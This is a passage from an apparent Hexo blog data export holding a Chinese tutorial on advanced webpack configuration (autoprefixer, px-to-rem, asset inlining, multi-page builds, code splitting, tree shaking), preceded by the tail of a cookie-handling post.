class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; false</span></span><br><span class=\"line\"><span class=\"comment\">// This will work!</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;); <span class=\"comment\">// =&gt; true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实践场景\"><a href=\"#实践场景\" class=\"headerlink\" title=\"实践场景\"></a>实践场景</h2><p>系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。<br>实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</a></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework</a></p>"},{"title":"webpack进阶用法一","date":"2019-09-16T01:18:30.000Z","updated":"2019-09-16T01:18:30.000Z","_content":"\n# 概述\n\n本文介绍的 webpack 用法有：自动清理构建目录、自动补齐 CSS3 前缀、移动端 CSS 中的 px 自动转成 rem、静态资源内联、多页面应用打包通用方案、使用 source map、提取页面公共资源和tree shaking 的使用和原理分析。\n\n<!-- more -->\n\n# 详述\n\n## 自动清理构建目录\n\n若频次很低，我们可以直接手动删除已构建文件。但是实际中我们要经常执行构建命令，这时候就需要自动清理构建目录文件了。思路一是用`npm scripts`，直接用系统命令：`rm -rf ./dist && webpack`，或者用 npm 包 rimraf：`rimraf ./dist && webpack`。思路二是用 webpack 插件`clean-webpack-plugin`，使用很简单，安装配置下即可，完成后每次构建就会自动清理已构建的目录文件。\n\n<!-- package.json -->\n\n```json\n  \"scripts\": {\n    \"build\": \"rm -rf ./dist && webpack --config webpack.prod.js\",\n    // \"build\": \"rimraf ./dist && webpack --config webpack.prod.js\",\n  }\n```\n\n<!-- webpack.prod.js -->\n\n```js\nplugins: [new CleanWebpackPlugin()];\n```\n\n## 自动补齐 CSS3 前缀\n\n由于各种浏览器对于 CSS3 新特性支持程度的不同，导致实际使用中需要针对不同内核浏览器给出前缀，示例如下：\n\n```css\n.box {\n  -moz-border-radius: 10px;\n  -webkit-border-radius: 10px;\n  -o-border-radius: 10px;\n  border-radius: 10px;\n}\n```\n\n实际生产中我们当然不想这么低效率，因此可以使用构建工具来自动完成这些。在 webpack 中可以使用 PostCSS 插件 autoprefixer 来实现。至于哪些属性需要加前缀，主要是根据配置的 browserslist 和[Can I Use](https://caniuse.com/)规则确定。具体使用，首先安装 npm 包`postcss-loader`和`autoprefixer`，然后配置具体参数，最后示例如下：\n\n<!-- webpack.prod.js -->\n\n```js\n  {\n      test: /.css$/,\n      use: [\n          'css-loader',\n          {\n              loader: 'postcss-loader',\n              options: {\n                  plugins: () => [\n                      require('autoprefixer')()\n                  ]\n              }\n          }\n      ]\n  },\n```\n\n<!-- package.json -->\n\n```json\n  \"browserslist\": [\n    \"last 2 version\",\n    \"> 1%\",\n    \"iOS 7\"\n  ],\n```\n\n## 移动端 CSS 中的 px 自动转成 rem\n\n![终端分辨率对比图](px2rem.jpg)\n为什么要转换，因为各终端分辨率不同，px 是绝对单位，想要响应式布局，就得针对不同分辨率作相应的调整。思路一是用媒体查询：\n\n```css\n@media screen and (max-width: 980px) {\n  .header {\n    width: 900px;\n  }\n}\n@media screen and (max-width: 480px) {\n  .header {\n    height: 400px;\n  }\n}\n@media screen and (max-width: 350px) {\n  .header {\n    height: 300px;\n  }\n}\n```\n\n思路二是用相对单位 rem，rem 是相对于页面根元素 html 的大小来确定其他元素的大小。使用 rem，条件一是动态设置 html 的 font-size，条件二是根据视觉稿编写具体元素的对应 px 的 rem 值。计算根元素的 font-size 值可以使用手淘的[lib-flexible](https://github.com/amfe/lib-flexible)库，px 转成 rem 可以利用样式预编译库的类函数功能去实现，也可以利用构建工具去处理。推荐`lib-flexible`+`px2rem-loader`，示例如下：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n    <script>\n      // lib-flexible库代码\n    </script>\n  </head>\n  <body></body>\n</html>\n```\n\n```js\n{\n    test: /.css$/,\n    use: [\n        'css-loader',\n        {\n            loader: 'px2rem-loader',\n            options: {\n                remUnit: 75,\n                remPrecision: 8\n            }\n        }\n    ]\n}\n```\n\n## 静态资源内联\n\n资源内联意义有：页面框架的初始化脚本、上报相关打点、css 内联避免页面闪动和减少 http 网络请求数。\n\n### HTML 和 JS 内联\n\n可以用 webpack 的 raw-loader 实现，示例如下（raw-loader@0.5.1）：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    ${require('raw-loader!./meta.html')}\n    <title>Document</title>\n    <script>\n      ${require('raw-loader!babel-loader!../../node_modules/lib-flexible/flexible.js')}\n    </script>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n  </body>\n</html>\n```\n\n### CSS 内联\n\n用 webpack 的 style-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /\\.scss$/,\n      use: [\n        {\n          loader: \"style-loader\",\n          options: {\n            insertAt: \"top\", // 样式插入到<head>\n            singleton: true //将所有的style标签合并成一个\n          }\n        },\n        \"css-loader\",\n        \"sass-loader\"\n      ]\n    }\n  ];\n}\n```\n\n### 小图片或者字体内联\n\n用 webpack 的 url-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /.(png|jpg|gif|jpeg)$/,\n      use: [\n        {\n          loader: \"url-loader\",\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    },\n    {\n      test: /.(woff|woff2|eot|ttf|otf)$/,\n      use: [\n        {\n          loader: \"url-loader\",\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    }\n  ];\n}\n```\n\n## 多页面应用打包通用方案\n\n思路一，每个页面对应一个 entry，一个 html-webpack-plugin，缺点就是增删页面需要修改 webpack 配置文件。\n思路二，动态获取 entry 和设置 html-webpack-plugin 数量，前提是约定各个页面文件结构，例如每个页面一个单独文件夹，每个入口文件名都为 index.js。示例如下：\n\n<!-- webpack.config.js -->\n\n```js\n\"use strict\";\n\nconst glob = require(\"glob\");\nconst path = require(\"path\");\nconst HtmlWebpackPlugin = require(\"html-webpack-plugin\");\nconst { CleanWebpackPlugin } = require(\"clean-webpack-plugin\");\n\nconst setMPA = () => {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n\n  const entryFiles = glob.sync(path.join(__dirname, \"./src/*/index.js\"));\n\n  Object.keys(entryFiles).map(index => {\n    const entryFile = entryFiles[index];\n    const match = entryFile.match(/src\\/(.*)\\/index\\.js/);\n    const fileName = match && match[1];\n    entry[fileName] = entryFile;\n\n    htmlWebpackPlugins.push(\n      new HtmlWebpackPlugin({\n        template: path.join(__dirname, `src/${fileName}/index.html`),\n        filename: `${fileName}.html`,\n        chunks: [\"vendors\", fileName],\n        inject: true,\n        minify: {\n          html5: true,\n          collapseWhitespace: true,\n          preserveLineBreaks: false,\n          minifyCSS: true,\n          minifyJS: true,\n          removeComments: false\n        }\n      })\n    );\n  });\n\n  return {\n    entry,\n    htmlWebpackPlugins\n  };\n};\n\nconst { entry, htmlWebpackPlugins } = setMPA();\n\nmodule.exports = {\n  entry: entry,\n  output: {\n    path: path.join(__dirname, \"dist\"),\n    filename: \"[name]_[chunkhash:8].js\"\n  },\n\n  plugins: [new CleanWebpackPlugin()].concat(htmlWebpackPlugins)\n};\n```\n\n这个示例中使用了 npm 包`glob`来读文件，当然也可以直接用 node 的 fs 模块实现，或者其他功能包。\n\n## 使用 source map\n\n作用是通过 source map 定位到源代码，主要用于调试，所以开发环境开启，线上环境关闭。source map 类型很多，重点是掌握几个关键字的含义，然后各种类型含义也只是关键字的组合。关键字含义如下：\n\n- source map: 产生.map 文件\n- eval: 使用 eval 包裹模块代码\n- cheap: 不包含列列信息\n- inline: 将.map 作为 DataURI 嵌入，不不单独生成.map 文件\n- module:包含 loader 的 sourcemap\n\n## 提取页面公共资源\n\n### 基础库分离\n\n将 react、react-dom 基础包通过 cdn 引入，不打入 bundle 中，可以使用`html-webpackexternals-plugin`实现：\n\n<!-- webpack.config.js -->\n\n```js\nconst HtmlWebpackExternalsPlugin = require(\"html-webpack-externals-plugin\");\nmodule.exports = {\n  plugins: [\n    new HtmlWebpackExternalsPlugin({\n      externals: [\n        {\n          module: \"react\",\n          entry: \"https://unpkg.com/react@16/umd/react.production.min.js\",\n          global: \"React\"\n        },\n        {\n          module: \"react-dom\",\n          entry:\n            \"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\",\n          global: \"ReactDOM\"\n        }\n      ]\n    })\n  ]\n};\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    <script src=\"https://unpkg.com/react@16/umd/react.production.min.js\"></script>\n\n    <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"></script>\n  </body>\n</html>\n```\n\n### 利用 SplitChunksPlugin 进行公共脚本分离\n\n利用 SplitChunksPlugin 分离基础包\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      cacheGroups: {\n        commons: {\n          test: /(react|react-dom)/, //匹配出需要分离的包\n          name: \"vendors\",\n          chunks: \"all\"\n        }\n      }\n    }\n  }\n};\n```\n\n利用 SplitChunksPlugin 分离页面公共文件\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      minSize: 0, //分离的包体积的大小\n      cacheGroups: {\n        commons: {\n          name: \"commons\",\n          chunks: \"all\",\n          minChunks: 2 //设置最小引用次数为2次\n        }\n      }\n    }\n  }\n};\n```\n\n## tree shaking 的使用和原理分析\n\n### 概念\n\n1 个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到\nbundle 里面去，tree shaking 就是只把用到的方法打入 bundle，没用到的方法会在\nuglify 阶段被擦除掉。\n\n### 使用\n\nwebpack4.x 在 mode 设置为 production 时默认开启，webpack3.x 与 webpack2.x 在.babelrc 里设置 modules: false 即可。\n\n### DCE (Dead code elimination)\n\n在保持代码运行结果不变的前提下，去除无用的代码。\n\n- 代码执行的结果不会被用到\n- 代码不会被执行，不可到达\n- 代码只会影响死变量（只写不不读）\n  tree shaking 是 DCE 的一种方式，它可以在打包时忽略没有用到的代码。\n\n```js\nif (false) {\nconsole.log('这段代码永远不会执行’);\n}\n```\n\n### 原理\n\n利用 ES6 模块的特点（只能作为模块顶层的语句句出现、import 的模块名只能是字符串串常量和引入的模块不可改变），在打包阶段对静态代码进行 AST 语法分析，对有用和无用的模块打上不同标签，“uglify”阶段删除无用代码。\n\n### 局限性\n\n1，只能是静态声明和引用的 ES6 模块，不能是动态引入和声明的；\n\n在打包阶段对冗余代码进行删除，就需要 webpack 需要在打包阶段确定模块文件的内部结构，而 ES 模块的引用和输出必须出现在文件结构的第一级（'import' and 'export' may only appear at the top level），否则会报错。\n\n```js\n// webpack编译时会报错\nif (condition) {\n  import module1 from \"./module1\";\n} else {\n  import module2 from \"./module2\";\n}\n```\n\n而 CommonJS 模块支持动态结构的，所以不能对 CommonJS 模块进行 tree-shaking 处理。\n\n2，只能处理模块级别，不能处理函数级别的冗余；\n因为 webpack 的 tree-shaking 是基于模块间的依赖关系，所以并不能对模块内部自身的无用代码进行删除。\n\n3，只能处理 JS 相关冗余代码，不能处理 CSS 冗余代码。\n\n# 参考\n\n《极客时间》\n","source":"_posts/2019/09/webpack进阶用法一.md","raw":"---\ntitle: webpack进阶用法一\npermalink: webpack-advance-1\ntags:\n  - webpack\ncategories:\n  - 工具\ndate: 2019-09-16 09:18:30\nupdated: 2019-09-16 09:18:30\n---\n\n# 概述\n\n本文介绍的 webpack 用法有：自动清理构建目录、自动补齐 CSS3 前缀、移动端 CSS 中的 px 自动转成 rem、静态资源内联、多页面应用打包通用方案、使用 source map、提取页面公共资源和tree shaking 的使用和原理分析。\n\n<!-- more -->\n\n# 详述\n\n## 自动清理构建目录\n\n若频次很低，我们可以直接手动删除已构建文件。但是实际中我们要经常执行构建命令，这时候就需要自动清理构建目录文件了。思路一是用`npm scripts`，直接用系统命令：`rm -rf ./dist && webpack`，或者用 npm 包 rimraf：`rimraf ./dist && webpack`。思路二是用 webpack 插件`clean-webpack-plugin`，使用很简单，安装配置下即可，完成后每次构建就会自动清理已构建的目录文件。\n\n<!-- package.json -->\n\n```json\n  \"scripts\": {\n    \"build\": \"rm -rf ./dist && webpack --config webpack.prod.js\",\n    // \"build\": \"rimraf ./dist && webpack --config webpack.prod.js\",\n  }\n```\n\n<!-- webpack.prod.js -->\n\n```js\nplugins: [new CleanWebpackPlugin()];\n```\n\n## 自动补齐 CSS3 前缀\n\n由于各种浏览器对于 CSS3 新特性支持程度的不同，导致实际使用中需要针对不同内核浏览器给出前缀，示例如下：\n\n```css\n.box {\n  -moz-border-radius: 10px;\n  -webkit-border-radius: 10px;\n  -o-border-radius: 10px;\n  border-radius: 10px;\n}\n```\n\n实际生产中我们当然不想这么低效率，因此可以使用构建工具来自动完成这些。在 webpack 中可以使用 PostCSS 插件 autoprefixer 来实现。至于哪些属性需要加前缀，主要是根据配置的 browserslist 和[Can I Use](https://caniuse.com/)规则确定。具体使用，首先安装 npm 包`postcss-loader`和`autoprefixer`，然后配置具体参数，最后示例如下：\n\n<!-- webpack.prod.js -->\n\n```js\n  {\n      test: /.css$/,\n      use: [\n          'css-loader',\n          {\n              loader: 'postcss-loader',\n              options: {\n                  plugins: () => [\n                      require('autoprefixer')()\n                  ]\n              }\n          }\n      ]\n  },\n```\n\n<!-- package.json -->\n\n```json\n  \"browserslist\": [\n    \"last 2 version\",\n    \"> 1%\",\n    \"iOS 7\"\n  ],\n```\n\n## 移动端 CSS 中的 px 自动转成 rem\n\n![终端分辨率对比图](px2rem.jpg)\n为什么要转换，因为各终端分辨率不同，px 是绝对单位，想要响应式布局，就得针对不同分辨率作相应的调整。思路一是用媒体查询：\n\n```css\n@media screen and (max-width: 980px) {\n  .header {\n    width: 900px;\n  }\n}\n@media screen and (max-width: 480px) {\n  .header {\n    height: 400px;\n  }\n}\n@media screen and (max-width: 350px) {\n  .header {\n    height: 300px;\n  }\n}\n```\n\n思路二是用相对单位 rem，rem 是相对于页面根元素 html 的大小来确定其他元素的大小。使用 rem，条件一是动态设置 html 的 font-size，条件二是根据视觉稿编写具体元素的对应 px 的 rem 值。计算根元素的 font-size 值可以使用手淘的[lib-flexible](https://github.com/amfe/lib-flexible)库，px 转成 rem 可以利用样式预编译库的类函数功能去实现，也可以利用构建工具去处理。推荐`lib-flexible`+`px2rem-loader`，示例如下：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n    <script>\n      // lib-flexible库代码\n    </script>\n  </head>\n  <body></body>\n</html>\n```\n\n```js\n{\n    test: /.css$/,\n    use: [\n        'css-loader',\n        {\n            loader: 'px2rem-loader',\n            options: {\n                remUnit: 75,\n                remPrecision: 8\n            }\n        }\n    ]\n}\n```\n\n## 静态资源内联\n\n资源内联意义有：页面框架的初始化脚本、上报相关打点、css 内联避免页面闪动和减少 http 网络请求数。\n\n### HTML 和 JS 内联\n\n可以用 webpack 的 raw-loader 实现，示例如下（raw-loader@0.5.1）：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    ${require('raw-loader!./meta.html')}\n    <title>Document</title>\n    <script>\n      ${require('raw-loader!babel-loader!../../node_modules/lib-flexible/flexible.js')}\n    </script>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n  </body>\n</html>\n```\n\n### CSS 内联\n\n用 webpack 的 style-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /\\.scss$/,\n      use: [\n        {\n          loader: \"style-loader\",\n          options: {\n            insertAt: \"top\", // 样式插入到<head>\n            singleton: true //将所有的style标签合并成一个\n          }\n        },\n        \"css-loader\",\n        \"sass-loader\"\n      ]\n    }\n  ];\n}\n```\n\n### 小图片或者字体内联\n\n用 webpack 的 url-loader\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /.(png|jpg|gif|jpeg)$/,\n      use: [\n        {\n          loader: \"url-loader\",\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    },\n    {\n      test: /.(woff|woff2|eot|ttf|otf)$/,\n      use: [\n        {\n          loader: \"url-loader\",\n          options: {\n            limit: 10240\n          }\n        }\n      ]\n    }\n  ];\n}\n```\n\n## 多页面应用打包通用方案\n\n思路一，每个页面对应一个 entry，一个 html-webpack-plugin，缺点就是增删页面需要修改 webpack 配置文件。\n思路二，动态获取 entry 和设置 html-webpack-plugin 数量，前提是约定各个页面文件结构，例如每个页面一个单独文件夹，每个入口文件名都为 index.js。示例如下：\n\n<!-- webpack.config.js -->\n\n```js\n\"use strict\";\n\nconst glob = require(\"glob\");\nconst path = require(\"path\");\nconst HtmlWebpackPlugin = require(\"html-webpack-plugin\");\nconst { CleanWebpackPlugin } = require(\"clean-webpack-plugin\");\n\nconst setMPA = () => {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n\n  const entryFiles = glob.sync(path.join(__dirname, \"./src/*/index.js\"));\n\n  Object.keys(entryFiles).map(index => {\n    const entryFile = entryFiles[index];\n    const match = entryFile.match(/src\\/(.*)\\/index\\.js/);\n    const fileName = match && match[1];\n    entry[fileName] = entryFile;\n\n    htmlWebpackPlugins.push(\n      new HtmlWebpackPlugin({\n        template: path.join(__dirname, `src/${fileName}/index.html`),\n        filename: `${fileName}.html`,\n        chunks: [\"vendors\", fileName],\n        inject: true,\n        minify: {\n          html5: true,\n          collapseWhitespace: true,\n          preserveLineBreaks: false,\n          minifyCSS: true,\n          minifyJS: true,\n          removeComments: false\n        }\n      })\n    );\n  });\n\n  return {\n    entry,\n    htmlWebpackPlugins\n  };\n};\n\nconst { entry, htmlWebpackPlugins } = setMPA();\n\nmodule.exports = {\n  entry: entry,\n  output: {\n    path: path.join(__dirname, \"dist\"),\n    filename: \"[name]_[chunkhash:8].js\"\n  },\n\n  plugins: [new CleanWebpackPlugin()].concat(htmlWebpackPlugins)\n};\n```\n\n这个示例中使用了 npm 包`glob`来读文件，当然也可以直接用 node 的 fs 模块实现，或者其他功能包。\n\n## 使用 source map\n\n作用是通过 source map 定位到源代码，主要用于调试，所以开发环境开启，线上环境关闭。source map 类型很多，重点是掌握几个关键字的含义，然后各种类型含义也只是关键字的组合。关键字含义如下：\n\n- source map: 产生.map 文件\n- eval: 使用 eval 包裹模块代码\n- cheap: 不包含列列信息\n- inline: 将.map 作为 DataURI 嵌入，不不单独生成.map 文件\n- module:包含 loader 的 sourcemap\n\n## 提取页面公共资源\n\n### 基础库分离\n\n将 react、react-dom 基础包通过 cdn 引入，不打入 bundle 中，可以使用`html-webpackexternals-plugin`实现：\n\n<!-- webpack.config.js -->\n\n```js\nconst HtmlWebpackExternalsPlugin = require(\"html-webpack-externals-plugin\");\nmodule.exports = {\n  plugins: [\n    new HtmlWebpackExternalsPlugin({\n      externals: [\n        {\n          module: \"react\",\n          entry: \"https://unpkg.com/react@16/umd/react.production.min.js\",\n          global: \"React\"\n        },\n        {\n          module: \"react-dom\",\n          entry:\n            \"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\",\n          global: \"ReactDOM\"\n        }\n      ]\n    })\n  ]\n};\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <title>Document</title>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    <script src=\"https://unpkg.com/react@16/umd/react.production.min.js\"></script>\n\n    <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"></script>\n  </body>\n</html>\n```\n\n### 利用 SplitChunksPlugin 进行公共脚本分离\n\n利用 SplitChunksPlugin 分离基础包\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      cacheGroups: {\n        commons: {\n          test: /(react|react-dom)/, //匹配出需要分离的包\n          name: \"vendors\",\n          chunks: \"all\"\n        }\n      }\n    }\n  }\n};\n```\n\n利用 SplitChunksPlugin 分离页面公共文件\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      minSize: 0, //分离的包体积的大小\n      cacheGroups: {\n        commons: {\n          name: \"commons\",\n          chunks: \"all\",\n          minChunks: 2 //设置最小引用次数为2次\n        }\n      }\n    }\n  }\n};\n```\n\n## tree shaking 的使用和原理分析\n\n### 概念\n\n1 个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到\nbundle 里面去，tree shaking 就是只把用到的方法打入 bundle，没用到的方法会在\nuglify 阶段被擦除掉。\n\n### 使用\n\nwebpack4.x 在 mode 设置为 production 时默认开启，webpack3.x 与 webpack2.x 在.babelrc 里设置 modules: false 即可。\n\n### DCE (Dead code elimination)\n\n在保持代码运行结果不变的前提下，去除无用的代码。\n\n- 代码执行的结果不会被用到\n- 代码不会被执行，不可到达\n- 代码只会影响死变量（只写不不读）\n  tree shaking 是 DCE 的一种方式，它可以在打包时忽略没有用到的代码。\n\n```js\nif (false) {\nconsole.log('这段代码永远不会执行’);\n}\n```\n\n### 原理\n\n利用 ES6 模块的特点（只能作为模块顶层的语句句出现、import 的模块名只能是字符串串常量和引入的模块不可改变），在打包阶段对静态代码进行 AST 语法分析，对有用和无用的模块打上不同标签，“uglify”阶段删除无用代码。\n\n### 局限性\n\n1，只能是静态声明和引用的 ES6 模块，不能是动态引入和声明的；\n\n在打包阶段对冗余代码进行删除，就需要 webpack 需要在打包阶段确定模块文件的内部结构，而 ES 模块的引用和输出必须出现在文件结构的第一级（'import' and 'export' may only appear at the top level），否则会报错。\n\n```js\n// webpack编译时会报错\nif (condition) {\n  import module1 from \"./module1\";\n} else {\n  import module2 from \"./module2\";\n}\n```\n\n而 CommonJS 模块支持动态结构的，所以不能对 CommonJS 模块进行 tree-shaking 处理。\n\n2，只能处理模块级别，不能处理函数级别的冗余；\n因为 webpack 的 tree-shaking 是基于模块间的依赖关系，所以并不能对模块内部自身的无用代码进行删除。\n\n3，只能处理 JS 相关冗余代码，不能处理 CSS 冗余代码。\n\n# 参考\n\n《极客时间》\n","slug":"webpack-advance-1","published":1,"_id":"ck0m3d92700blwovvaayqp8pq","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文介绍的 webpack 用法有：自动清理构建目录、自动补齐 CSS3 前缀、移动端 CSS 中的 px 自动转成 rem、静态资源内联、多页面应用打包通用方案、使用 source map、提取页面公共资源和tree shaking 的使用和原理分析。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自动清理构建目录\"><a href=\"#自动清理构建目录\" class=\"headerlink\" title=\"自动清理构建目录\"></a>自动清理构建目录</h2><p>若频次很低，我们可以直接手动删除已构建文件。但是实际中我们要经常执行构建命令，这时候就需要自动清理构建目录文件了。思路一是用<code>npm scripts</code>，直接用系统命令：<code>rm -rf ./dist &amp;&amp; webpack</code>，或者用 npm 包 rimraf：<code>rimraf ./dist &amp;&amp; webpack</code>。思路二是用 webpack 插件<code>clean-webpack-plugin</code>，使用很简单，安装配置下即可，完成后每次构建就会自动清理已构建的目录文件。</p>\n<!-- package.json -->\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"build\": \"rm -rf ./dist &amp;&amp; webpack --config webpack.prod.js\",</span><br><span class=\"line\">  // \"build\": \"rimraf ./dist &amp;&amp; webpack --config webpack.prod.js\",</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<!-- webpack.prod.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [<span class=\"keyword\">new</span> CleanWebpackPlugin()];</span><br></pre></td></tr></table></figure>\n<h2 id=\"自动补齐-CSS3-前缀\"><a href=\"#自动补齐-CSS3-前缀\" class=\"headerlink\" title=\"自动补齐 CSS3 前缀\"></a>自动补齐 CSS3 前缀</h2><p>由于各种浏览器对于 CSS3 新特性支持程度的不同，导致实际使用中需要针对不同内核浏览器给出前缀，示例如下：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-o-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实际生产中我们当然不想这么低效率，因此可以使用构建工具来自动完成这些。在 webpack 中可以使用 PostCSS 插件 autoprefixer 来实现。至于哪些属性需要加前缀，主要是根据配置的 browserslist 和<a href=\"https://caniuse.com/\" target=\"_blank\" rel=\"noopener\">Can I Use</a>规则确定。具体使用，首先安装 npm 包<code>postcss-loader</code>和<code>autoprefixer</code>，然后配置具体参数，最后示例如下：</p>\n<!-- webpack.prod.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/.css$/</span>,</span><br><span class=\"line\">    use: [</span><br><span class=\"line\">        <span class=\"string\">'css-loader'</span>,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            loader: <span class=\"string\">'postcss-loader'</span>,</span><br><span class=\"line\">            options: &#123;</span><br><span class=\"line\">                plugins: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> [</span><br><span class=\"line\">                    <span class=\"built_in\">require</span>(<span class=\"string\">'autoprefixer'</span>)()</span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<!-- package.json -->\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"browserslist\": [</span><br><span class=\"line\">  \"last 2 version\",</span><br><span class=\"line\">  \"&gt; 1%\",</span><br><span class=\"line\">  <span class=\"string\">\"iOS 7\"</span></span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure>\n<h2 id=\"移动端-CSS-中的-px-自动转成-rem\"><a href=\"#移动端-CSS-中的-px-自动转成-rem\" class=\"headerlink\" title=\"移动端 CSS 中的 px 自动转成 rem\"></a>移动端 CSS 中的 px 自动转成 rem</h2><p><img src=\"/webpack-advance-1/px2rem.jpg\" alt=\"终端分辨率对比图\"><br>为什么要转换，因为各终端分辨率不同，px 是绝对单位，想要响应式布局，就得针对不同分辨率作相应的调整。思路一是用媒体查询：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">980px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">900px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">480px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">400px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> 